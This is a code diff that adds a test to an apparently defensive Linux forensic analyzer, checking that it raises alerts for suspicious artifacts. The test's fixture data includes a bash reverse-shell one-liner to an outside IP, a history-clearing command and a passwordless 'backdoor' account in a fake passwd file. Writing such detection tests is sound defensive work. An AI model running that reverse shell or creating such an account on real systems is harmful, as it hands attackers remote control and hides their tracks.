@@ -176,3 +176,17 @@ def test_wtmp_and_lastlog_parsing(tmp_path):
     lastlog[296:301] = b"ttyS0"
     entries = logs.parse_lastlog(_write(str(tmp_path), "lastlog", bytes(lastlog)))
     assert entries == [{"uid": 1, "time": "2026-10-21T08:51:31+00:00", "line": "ttyS0", "host": ""}]
+
+
+def test_offensive_history_and_account_anomalies_are_alerts(tmp_path):
+    from forensic_analyzer.analyzers.linux import LinuxArtifactsAnalyzer
+
+    (tmp_path / "etc").mkdir()
+    (tmp_path / "etc/passwd").write_text("root:x:0:0::/root:/bin/bash\nbackdoor::1001:1001::/home/b:/bin/bash\n")
+    (tmp_path / "root").mkdir()
+    (tmp_path / "root/.bash_history").write_text("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\nhistory -c\n")
+    finding = LinuxArtifactsAnalyzer().analyze(str(tmp_path))
+    alerts = [k for k in finding.metadata if k.startswith("[ALERTE]")]
+    assert any("Shell inversé" in k for k in alerts)
+    assert any("sans mot de passe" in k for k in alerts)
+    assert "T1059.004" in {t["id"] for t in finding.extra["mitre"]}
